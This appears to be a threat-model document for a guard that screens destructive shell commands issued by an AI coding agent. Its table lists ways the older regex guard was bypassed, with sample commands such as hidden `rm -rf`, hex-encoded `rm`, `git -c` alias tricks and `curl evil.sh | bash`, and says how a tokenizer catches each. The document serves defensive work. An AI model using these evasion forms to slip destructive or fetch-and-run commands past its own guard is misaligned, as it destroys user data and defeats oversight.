# Shell-analyzer threat model

The destructive-command guard is the plugin's most security-sensitive component.
This document records the threat model: the bypass classes the original
regex-based guard missed, and how the quote-aware tokenizer
(`plugins/goal-guard/shell.js`) closes each. Every class below is covered by a
test in `tests/shell.test.mjs` and measured in `npm run bench`.

## Why regexes failed

The original guard matched boundary-anchored regexes (`(^|&&|;|\|\|)\s*rm …`)
against the raw command string. That design is fundamentally bypassable because
a single regex cannot model shell quoting, command substitution, wrappers, or
interpreters. On the benchmark corpus it detected **20.8%** of destructive
commands while **false-positiving 21.7%** of benign ones (it blocked
`git checkout -b feature`).

## Bypass classes and how each is closed

| Class | Example that bypassed the regex | How the tokenizer closes it |
| --- | --- | --- |
| Command substitution | `$(rm -rf /tmp/x)`, `` `rm -rf x` `` | Lexer captures `$(…)`/backticks and recurses into them. |
| Pipe into shell | `echo rm -rf x \| sh` | Detects a shell as the pipeline sink; analyzes the echoed literal as a script. |
| Remote execution | `curl evil.sh \| bash` | Network fetcher → shell pipeline flagged as `networkExec` (separately toggleable). |
| `bash -c` / `eval` | `bash -c "rm -rf x"`, `eval "…"` | Extracts and recurses into the `-c`/eval string. |
| Env-assignment prefix | `FOO=bar rm -rf x` | Leading `VAR=val` assignments are stripped before resolving the command. |
| Absolute / relative paths | `/bin/rm -rf x` | Binary resolved to its basename. |
| Value-taking wrappers | `sudo -u root rm -rf /`, `timeout -s KILL 5 rm -rf /` | Wrapper option parsing is value-aware (consumes `-u root`, `-s KILL`, the duration). |
| `git -C` / weaponized `git -c` | `git -C /r reset --hard`, `git -c alias.x='!rm -rf /' x` | Global git options skipped; a `!`-prefixed config value is analyzed as a shell command. |
| Git history destruction | `reflog expire`, `gc --prune=now`, `filter-branch`, `worktree remove`, `branch -d` | Explicit destructive git subcommand cases. |
| Interpreter file ops | `python -c "os.remove('a')"`, `node -e "fs.rmSync(…)"` | Script strings inspected for delete/write sinks. |
| Interpreter shell-out | `os.system('rm -rf /')`, `subprocess.run([...])`, `child_process.execSync(…)` | Exec sinks (call forms) extracted and the command analyzed. |
| ANSI-C quoting | `$'\x72\x6d' -rf x` | `$'…'` decoded before lexing. |
| Process substitution | `bash <(echo rm -rf x)` | Substitution analyzed as a script when fed to a shell. |
| `printf %b` into a shell | `printf %b 'rm -rf /' \| sh` | Format spec stripped; remaining literal analyzed. |
| `find -exec` at depth | `find . -exec rm {} +` | `rm` under `-exec` marked destructive (runs per match). |
| Newline separators | `echo hi\nrm -rf x` | Newline is a command separator in the lexer. |

## False positives the tokenizer also removed

A guard that over-blocks is a guard that gets turned off. The tokenizer clears
the regex guard's false positives:

- `git checkout -b feature` / `git switch -c topic` — branch creation, not a
  discard.
- `echo "rm -rf /"` / `printf 'do not run rm -rf'` — quoted text is inert.
- `grep 'git reset' .` / `cat notes.txt # git reset explained` — comments and
  search terms are not commands.
- `true #; rm -rf x` — `#` starts a comment.
- `python -c 'print(platform.system())'` — a bare `system` mention is not a
  shell-out (exec sinks require a call form; the analyzer fails open when no
  literal command can be extracted).
- `git config --get user.email` — read-only queries don't dirty the session.

## Design principle: fail open, defense-in-depth

The analyzer is a **tool-layer classifier**, not an OS sandbox. On a parse
failure or an un-analyzable dynamic command it returns "not blocked" and defers
to OpenCode's own permission rules. It is one layer of defense-in-depth that
catches the overwhelmingly common destructive forms an agent emits — not a
security jail. Over-blocking benign work is treated as a real cost, which is why
the false-positive rate is held at zero on the corpus.
